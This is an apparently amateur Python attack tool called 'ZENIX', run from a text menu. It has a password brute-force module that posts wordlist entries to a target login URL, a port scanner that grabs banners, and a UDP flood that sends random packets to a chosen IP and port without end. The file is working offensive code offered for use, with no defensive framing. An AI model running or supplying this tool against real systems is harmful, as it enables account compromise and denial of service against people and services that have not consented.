import socket  
import sys
import time
import random
from colorama import Fore, Style, init

init(autoreset=True)

def print_banner():
    
    banner = f"""
{Fore.CYAN}    ███████╗███████╗███╗   ██╗██╗██╗  ██╗
{Fore.CYAN}    ╚══███╔╝██╔════╝████╗  ██║██║╚██╗██╔╝
{Fore.CYAN}       ███╔╝ █████╗  ██╔██╗ ██║██║ ╚███╔╝ 
{Fore.CYAN}      ███╔╝  ██╔══╝  ██║╚██╗██║██║ ██╔██╗ 
{Fore.CYAN}     ███████╗███████╗██║ ╚████║██║██╔╝ ██╗
{Fore.CYAN}     ╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
    {Fore.RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    {Fore.WHITE}  [+] Created by: {Fore.YELLOW}dward043
    {Fore.WHITE}  [+] Version:    {Fore.YELLOW}1.0.0
    {Fore.WHITE}  [+] Status:     {Fore.GREEN}Active / Secure
    {Fore.RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    {Fore.WHITE}[1] {Fore.YELLOW}Brute-force attack
    {Fore.WHITE}[2] {Fore.YELLOW}Scan for vulnerabilities
    {Fore.WHITE}[3] {Fore.YELLOW}DDoS attack
    {Fore.WHITE}[4] {Fore.RED}Exit
    """
    for line in banner.splitlines():
        print(line)
        time.sleep(0.05)


print_banner()

import requests 

def brute_force_module():
    print(f"\n{Fore.CYAN}[--- BRUTE FORCE MODULE ---]")
    target_url = input(f"{Fore.BLUE}[?] Target Login URL (örn: http://test.com/login): ")
    username = input(f"{Fore.BLUE}[?] Target Username: ")
    wordlist_path = "passwords.txt"
    
    user_field = "username" 
    pass_field = "password"

    try:
        with open(wordlist_path, 'r') as file:
            passwords = file.read().splitlines()

        print(f"{Fore.YELLOW}[*] Attempting to crack {username} on {target_url}...")

        for password in passwords:
            
            data = {user_field: username, pass_field: password}
            
            
            response = requests.post(target_url, data=data)

            
            if "Login failed" not in response.text and response.status_code == 200:
                print(f"{Fore.GREEN}[+] SUCCESS! Password found: {password}")
                return
            else:
                print(f"{Fore.RED}[-] Failed: {password}")
                
            time.sleep(1) 

    except FileNotFoundError:
        print(f"{Fore.RED}[X] Error: passwords.txt not found!")
    except Exception as e:
        print(f"{Fore.RED}[X] Connection Error: {e}")


        import socket 

def scan_vulnerabilities():
    print(f"\n{Fore.CYAN}[--- VULNERABILITY SCANNER ---]")
    target = input(f"{Fore.BLUE}[?] Target IP or Domain: ")
    
    
    common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 8080]
    
    print(f"{Fore.YELLOW}[*] Scanning {target} for common open ports...\n")

    for port in common_ports:
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1) 
        
        result = s.connect_ex((target, port)) 
        
        if result == 0:
            print(f"{Fore.GREEN}[+] Port {port} is OPEN!")
            
            
            try:
                
                s.send(b'Hello\r\n')
                banner = s.recv(1024).decode().strip()
                if banner:
                    print(f"    {Fore.MAGENTA}--> Service Info: {banner}")
            except:
                pass
        else:
            print(f"{Fore.RED}[-] Port {port} is closed.")
            pass
            
        s.close()
    
    print(f"\n{Fore.YELLOW}[*] Scan complete.")



def ddos_attack():
    print(f"\n{Fore.RED}[--- DOS ATTACK MODULE ---]")
    target_ip = input(f"{Fore.BLUE}[?] Target IP: ")
    target_port = int(input(f"{Fore.BLUE}[?] Target Port (örn: 80): "))
    
     
    bytes_to_send = random._urandom(1024)
    
     
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    print(f"{Fore.YELLOW}[*] Starting attack on {target_ip}:{target_port}...")
    time.sleep(2)
    
    sent_packets = 0
    try:
        while True:
             
            s.sendto(bytes_to_send, (target_ip, target_port))
            sent_packets += 1
            
             
            if sent_packets % 100 == 0:
                print(f"{Fore.GREEN}[+] Sent {sent_packets} packets to {target_ip}", end="\r")
            
             
            time.sleep(0.0001)
    except socket.gaierror:
        print(f"\n{Fore.RED}[X] Error: Invalid target IP or domain.")
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Attack stopped by user.")
    except Exception as e:
        print(f"\n{Fore.RED}[X] Error: {e}")
    finally:
        s.close()

while True:
    
    option = input(f"\n{Fore.GREEN}Select an option: {Style.RESET_ALL}")

    if option == "1":
        brute_force_module()
       
    
    elif option == "2":
        scan_vulnerabilities()
       
    
    elif option == "3":
        ddos_attack()
       
    
    elif option == "4":
        print(f"{Fore.RED}Exiting... Good bye!{Style.RESET_ALL}")
        sys.exit()
    
    else:
        print(f"{Fore.RED}[X] Invalid option. Please select 1-4.{Style.RESET_ALL}")